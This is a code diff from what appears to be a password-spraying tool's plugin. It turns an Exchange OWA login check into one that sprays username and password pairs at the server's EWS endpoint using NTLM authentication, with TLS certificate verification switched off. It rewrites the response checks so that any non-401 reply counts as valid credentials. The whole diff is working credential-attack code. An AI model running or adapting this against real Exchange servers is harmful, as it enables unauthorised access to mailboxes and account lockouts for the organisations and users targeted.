@@ -4,11 +4,11 @@ import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
-def owa_authenticate(url, username, password, useragent, pluginargs):
+def spray_ews_authenticate(url, username, password, useragent, pluginargs):
 
     data_response = {
         'result' : None,    # Can be "success", "failure" or "potential"
-        'error': False,
+        'error' : False,
         'output' : "",
         'valid_user' : False
     }
@@ -30,14 +30,9 @@ def owa_authenticate(url, username, password, useragent, pluginargs):
 
     try:
 
-        resp = requests.get(f"{url}/autodiscover/autodiscover.xml", headers=headers, auth=HttpNtlmAuth(username, password), verify=False)
+        resp = requests.post(f"{url}/ews/", headers=headers, auth=HttpNtlmAuth(username, password), verify=False)
 
-        if resp.status_code == 200:
-            data_response['output'] = f"[+] SUCCESS: Found credentials: {username}:{password}"
-            data_response['result'] = "success"
-            data_response['valid_user'] = True
-
-        elif resp.status_code == 500:
+        if resp.status_code == 500:
             data_response['output'] = f"[*] POTENTIAL: Found credentials, but server returned 500: {username}:{password}"
             data_response['result'] = "potential"
             data_response['valid_user'] = True
@@ -47,9 +42,14 @@ def owa_authenticate(url, username, password, useragent, pluginargs):
             data_response['result'] = "potential"
             data_response['valid_user'] = True
 
+        elif resp.status_code != 401:
+            data_response['result'] = "success"
+            data_response['output'] = f"[+] SUCCESS: {username}:{password}"
+            data_response['valid_user'] = True
+
         else:
-            data_response['output'] = f"[-] FAILURE: Invalid credentials: {username}:{password}"
             data_response['result'] = "failure"
+            data_response['output'] = f"[-] FAILURE: {username}:{password}"
 
 
     except Exception as ex:
